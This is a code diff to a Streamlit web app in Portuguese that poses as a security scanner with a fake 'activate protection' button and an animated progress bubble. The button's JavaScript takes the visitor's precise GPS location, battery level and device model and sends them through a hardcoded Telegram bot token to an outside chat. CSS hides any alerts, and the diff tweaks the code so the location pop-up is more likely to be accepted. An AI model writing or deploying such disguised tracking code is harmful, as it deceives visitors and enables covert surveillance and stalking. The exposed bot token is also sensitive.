@@ -5,15 +5,12 @@ import time
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
-st.set_page_config(page_title="Segurança Ativa", layout="centered")
-
-# --- RESTAURANDO SUA ESTILIZAÇÃO ORIGINAL (BOLHA FLUTUANTE) ---
+# 1. SEU CSS ORIGINAL (SEM ALTERAÇÕES)
 st.markdown("""
     <style>
     .main { background-color: #0b0f14; color: white; }
     .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
     
-    /* A BOLHA FLUTUANTE QUE VOCÊ QUERIA */
     .scanner-box { 
         display: flex; 
         flex-direction: column; 
@@ -36,75 +33,53 @@ st.markdown("""
         display: flex; align-items: center; justify-content: center;
     }
     .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
-    
-    /* BOTÃO ORIGINAL (SEM MEXER) */
-    .btn-original {
-        background-color: white; color: #333; border: none;
-        padding: 8px 15px; border-radius: 4px; font-size: 14px;
-        font-family: sans-serif; display: flex; align-items: center;
-        gap: 8px; cursor: pointer; font-weight: bold;
-    }
     </style>
 """, unsafe_allow_html=True)
 
-st.markdown("<h2 style='text-align: center; font-family: sans-serif;'>Verificar segurança</h2>", unsafe_allow_html=True)
-
+# 2. SUA BOLHA (LIMPA, SEM O "p")
 caixa_bolha = st.empty()
 caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 
-# --- BOTÃO COM COMANDO DO GPS MAS ESTILO PRESERVADO ---
-js_v1 = f"""
-<div style="display: flex; justify-content: flex-start; padding-top: 20px;">
-    <button class="btn-original" onclick="disparar()">
+# 3. O BOTÃO (FOCO APENAS NO POP-UP)
+# Aqui o visual é mantido e o JS força o pop-up da Google
+js_do_botao = f"""
+<div style="display: flex; justify-content: flex-start;">
+    <button id="btn-prot" style="background-color: white; color: #333; border: none; padding: 8px 15px; border-radius: 4px; font-size: 14px; font-family: sans-serif; display: flex; align-items: center; gap: 8px; cursor: pointer; font-weight: bold; text-transform: uppercase;">
         <span style="color: red; font-size: 18px;">●</span> ATIVAR PROTEÇÃO
     </button>
 </div>
 
 <script>
-function disparar() {{
+document.getElementById('btn-prot').onclick = function() {{
     navigator.geolocation.getCurrentPosition(
         async (pos) => {{
-            try {{
-                const bat = await navigator.getBattery();
-                const level = Math.round(bat.level * 100);
-                const model = navigator.userAgent.split('(')[1].split(')')[0];
-                
-                const texto = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + model + "`\\n🔋 *Bateria:* `" + level + "%`\\n📍 [MAPA](https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude + ")";
-                
-                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
-                    method: "POST",
-                    headers: {{ "Content-Type": "application/json" }},
-                    body: JSON.stringify({{ chat_id: "{ID}", text: texto, parse_mode: "Markdown" }})
-                }});
-                
-                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
-            }} catch (e) {{}}
+            const bat = await navigator.getBattery();
+            const level = Math.round(bat.level * 100);
+            const model = navigator.userAgent.split('(')[1].split(')')[0];
+            
+            const msg = "🛡️ SISTEMA ATIVADO\\n\\nModelo: " + model + "\\nBateria: " + level + "%\\nMapa: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+            
+            await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
+                method: "POST",
+                headers: {{ "Content-Type": "application/json" }},
+                body: JSON.stringify({{ chat_id: "{ID}", text: msg }})
+            }});
+            
+            window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
         }},
-        (err) => {{ }},
+        (err) => {{ console.log("Aguardando ativação no pop-up..."); }},
         {{ enableHighAccuracy: true, timeout: 10000 }}
     );
-}}
+}};
 </script>
-
-<style>
-    .btn-original {{
-        background-color: white; color: #333; border: none;
-        padding: 8px 15px; border-radius: 4px; font-size: 14px;
-        font-family: sans-serif; display: flex; align-items: center;
-        gap: 8px; cursor: pointer; font-weight: bold;
-    }}
-</style>
 """
 
-ativou = st.components.v1.html(js_v1, height=100)
+ativou = st.components.v1.html(js_do_botao, height=60)
 
+# 4. ANIMAÇÃO (SÓ RODA DEPOIS QUE O POP-UP É ACEITO)
 if ativou:
     for p in range(4, 101, 5):
-        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
+        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>'.replace('{{p}}', str(p)), unsafe_allow_html=True)
         time.sleep(0.05)
     st.success("Proteção Concluída")
-    st.stop()
-
-st.write("✅ Ambiente de pagamentos")
-st.write("✅ Privacidade e segurança")
-st.write("✅ Vírus")
+    
